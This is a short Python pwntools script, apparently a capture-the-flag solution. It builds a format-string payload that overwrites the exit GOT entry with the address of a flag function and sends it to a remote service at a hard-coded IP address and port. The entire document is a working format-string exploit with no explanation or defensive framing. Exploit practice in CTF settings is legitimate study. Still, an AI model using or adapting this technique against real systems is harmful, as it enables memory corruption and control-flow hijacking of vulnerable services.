from pwn import *

# 0x404038 <exit@got.plt>
# 0x4011b6 < flag_func >:	0xe5894855fa1e0ff3

str = ""
str += (" %4198836p")
str += (" %69$n ")
# str += (" %4p ")
# str += ("%n")

# str += (" %p "*67)
# str += (" %4197537p ")
# str += ("%n")
str += ("Z"*(512-len(str)-8))

str += chr(0x38)
str += chr(0x40)
str += chr(0x40)
str += chr(0x00)
str += chr(0x00)
str += chr(0x00)
str += chr(0x00)
str += chr(0x00)

# print(str)
r = remote('140.113.207.240', 8835)

r.recvuntil("Give me some goodies:")

r.sendline(str)

r.recvline()
print(r.recvline())
